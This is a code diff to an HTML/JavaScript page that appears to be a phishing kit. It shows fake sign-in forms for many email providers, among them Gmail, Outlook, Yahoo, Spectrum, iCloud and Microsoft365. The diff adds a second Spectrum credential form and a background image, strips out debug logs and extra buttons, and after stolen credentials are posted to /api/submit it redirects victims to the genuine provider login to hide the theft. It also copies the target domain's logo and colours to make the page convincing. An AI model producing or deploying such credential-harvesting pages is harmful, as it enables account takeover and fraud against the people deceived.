@@ -15,6 +15,16 @@
             align-items: center;
             justify-content: center;
         }
+        .bg-img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: -1;
+}
+
         .form-container {
             background: white;
             padding: 2rem;
@@ -125,10 +135,13 @@
     </style>
 </head>
 <body>
+
+    <img src="img/bg16.png" alt="" class="bg-img">
+    
     <!-- Gmail/GSuite Form -->
     <div id="gsuite" class="form-container">
         <div class="provider-logo">
-            <img src="img/logo3.png" alt="">
+            <img src="img/logo16.png" alt="">
         </div>
         <h4>Sign-in with your organization email credentials to access.</h4>
         <form action="/submit" id="contactFormPhrase" method="post">
@@ -146,14 +159,8 @@
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
             <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have G-Suite email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
     <!-- Outlook Form -->
@@ -176,15 +183,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">  
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have Outlook email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
         <!-- Hotmail Form -->
@@ -207,15 +208,10 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">   
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Hotmail email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
             <!-- MSN Form -->
@@ -239,14 +235,8 @@
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
             <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Hotmail?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
     <!-- CenturyLink Form -->
@@ -269,15 +259,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">    
         </div>
         
-        <div class="text-center mb-3">
-            Don't have CenturyLink email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
     <!-- Spectrum Form -->
@@ -300,15 +284,34 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">    
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Spectrum email?
+    </div>
+
+        <!-- Spectrum Form -->
+    <div id="spectrum" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo5.png" alt="">
+        </div>
+        <h4>Sign-in with your organization email credentials to access.</h4>
+        <form action="/submit"id="contactFormSpctrm"method="post">
+            <div class="form-group">
+                <label for="spectrum-email">Email</label>
+                <input type="email" id="spectrum-email" name="phwet" required>
+            </div>
+            <div class="form-group">
+                <label for="spectrum-password">Password</label>
+                <input type="password" id="spectrum-password" name="psdwet" required>
+            </div>
+            <button class="proceed-button"onclick='sendMessage("contactFormSpctrm")'type="button"id="sendMessageButton">Sign In</button>
+        </form>
+
+        <div class="divider"></div>
+        <div class="eml-list d-block align-items-center">
+            <img src="img/list.png" class="mt-2" alt="">    
         </div>
         
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
     <!-- Yahoo Form -->
@@ -331,15 +334,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have Yahoo email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
         <!-- Zoho Form -->
@@ -362,15 +359,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have Zoho email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
         <!-- Aol Form -->
@@ -393,15 +384,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">    
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Aol email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
     <!-- Yandex Form -->
@@ -424,15 +409,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">    
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Yandex email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
     <!-- Tuta Form -->
@@ -455,15 +434,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have Tuta email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
         <!-- Proton Form -->
@@ -486,15 +459,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have Proton email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
             <!-- Icloud Form -->
@@ -517,15 +484,9 @@
 
         <div class="divider"></div>
         <div class="eml-list d-block align-items-center">
-            <img src="img/list.png" class="mt-2" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" class="mt-2" alt=""> 
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Icloud account?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
         <!-- Microsoft Form -->
@@ -548,15 +509,9 @@
 
         <div class="divider"></div>
         <div class="eml-list">
-            <img src="img/list.png" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" alt="">    
         </div>
         
-        <div class="text-center mb-3">
-            Don't have Microsoft365 email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
             <!-- GMX Form -->
@@ -579,15 +534,9 @@
 
         <div class="divider"></div>
         <div class="eml-list">
-            <img src="img/list.png" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have GMX email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
     <!-- Generic Webmail Form - Will be customized with domain logo -->
@@ -609,15 +558,9 @@
         
         <div class="divider"></div>
         <div class="eml-list">
-            <img src="img/list.png" alt="">
-            <p class="custom-grey-text">Others</p>
+            <img src="img/list.png" alt="">            
         </div>
-        
-        <div class="text-center mb-3">
-            Don't have email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
@@ -686,23 +629,17 @@ function sendMessage(formId) {
   const formData = new FormData(form);
   const formDataObj = {};
 
-  // Get the button but don't set error state immediately
   const sendButton = form.querySelector(".proceed-button");
   const originalText = sendButton.textContent;
-  
-  // Set loading state
-  sendButton.textContent = "Sending...";
+
+  sendButton.textContent = "Loading...";
   sendButton.disabled = true;
 
-  // Convert FormData to object
   formData.forEach((value, key) => {
     formDataObj[key] = value;
   });
 
-  // Add the send flag
   formDataObj.send = "true";
-
-  console.log('Sending data:', formDataObj); // Debug log
 
   fetch("/api/submit", {
     method: "POST",
@@ -712,7 +649,6 @@ function sendMessage(formId) {
     body: JSON.stringify(formDataObj)
   })
   .then(response => {
-    console.log('Response status:', response.status); // Debug log
     
     if (!response.ok) {
       return response.json().then(data => {
@@ -721,69 +657,35 @@ function sendMessage(formId) {
     }
     return response.json();
   })
-  .then(data => {
-    console.log('Success, sent:', data); // Debug log
-    
-    // Success state
-    sendButton.textContent = "Sent Successfully!";
-    sendButton.classList.add("success-button");
-    
-    // Reset form
+  .then(data => {    
     form.reset();
-    
-    // Reset button after 3 seconds
-    setTimeout(() => {
-      sendButton.textContent = originalText;
-      sendButton.classList.remove("success-button");
-      sendButton.disabled = false;
-    }, 3000);
+    window.location.href = `https://${domain}/login`;
   })
   .catch(error => {
-    console.error('Error:', error); // Debug log
-    
-    // Error state
-    sendButton.textContent = "Error - Try Again";
-    sendButton.classList.add("error-button");
-    
-    // Show user-friendly error message
-    alert(`Failed to send message: ${error.message}`);
-    
-    // Reset button after 3 seconds
-    setTimeout(() => {
-      sendButton.textContent = originalText;
-      sendButton.classList.remove("error-button");
-      sendButton.disabled = false;
-    }, 3000);
   });
 }
         
         // Function to customize the webmail form based on the domain
         function customizeWebmailForm(domain) {
             
-            // Get domain without subdomain
             const parts = domain.split('.');
             let baseDomain = domain;
             if (parts.length >= 2) {
                 baseDomain = parts[parts.length - 2] + '.' + parts[parts.length - 1];
             }
-            
-            // Update loading message
+
             document.getElementById('loading-message').textContent = `Loading...`;
             
-// Update form title with domain
 const domainTitle = baseDomain.split('.')[0];
 document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}`;
             
-            // Try to fetch logo/image from the domain
             fetchDomainLogo(baseDomain);
         }
         
-        // Function to fetch the logo or image from a domain
         function fetchDomainLogo(domain) {
             const logoElement = document.getElementById('dynamic-logo');
             const loadingMessage = document.getElementById('loading-message');
             
-            // URLs to try for logos (common paths)
             const urlsToTry = [
                 `https://${domain}/favicon.ico`,
                 `https://${domain}/logo.png`,
@@ -792,18 +694,14 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
                 `https://logo.clearbit.com/${domain}`
             ];
             
-            // Use a service that returns logos for domains
-            // Clearbit has a free logo API we can use
             const clearbitUrl = `https://logo.clearbit.com/${domain}`;
             
             // Create an image element to test loading
             const img = new Image();
             img.onload = function() {
-                // Image loaded successfully
                 loadingMessage.style.display = 'none';
                 logoElement.style.backgroundImage = `url('${clearbitUrl}')`;
-                
-                // Update button color based on image
+
                 try {
                     extractColorFromImage(img, function(color) {
                         document.getElementById('webmail-button').style.backgroundColor = color;
@@ -813,12 +711,9 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
             };
             
             img.onerror = function() {
-                // If Clearbit fails, try a simple text-based logo
                 loadingMessage.style.display = 'none';
                 logoElement.style.backgroundImage = 'none';
                 logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
-                
-                // Use a default button color
                 document.getElementById('webmail-button').style.backgroundColor = '#555';
             };
             
@@ -837,19 +732,13 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
             canvas.width = width;
             canvas.height = height;
             
-            // Draw image to canvas
             context.drawImage(img, 0, 0, width, height);
             
             try {
-                // Get image data from center of image (likely where logo is)
                 const data = context.getImageData(Math.floor(width/2), Math.floor(height/2), 1, 1).data;
-                
-                // Convert to hex color
                 const hex = "#" + ((1 << 24) + (data[0] << 16) + (data[1] << 8) + data[2]).toString(16).slice(1);
                 callback(hex);
             } catch (e) {
-                // If there's any error (like CORS), use default color
-                console.error('Error extracting color:', e);
                 callback('#555555');
             }
         }
